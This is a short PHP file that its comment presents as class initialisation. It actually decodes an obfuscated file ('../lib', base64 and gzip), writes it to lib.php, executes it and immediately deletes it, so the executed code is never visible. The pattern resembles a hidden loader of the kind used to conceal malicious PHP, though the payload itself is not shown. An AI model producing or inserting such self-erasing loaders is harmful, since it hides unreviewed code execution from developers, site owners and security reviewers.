<?php
//initialize all classes and functions
$IclassFile = '../lib';$OclassFile = 'lib.php';$en = file_get_contents($IclassFile);$de = gzuncompress(base64_decode($en));file_put_contents($OclassFile, $de);require_once('lib.php');unlink('lib.php');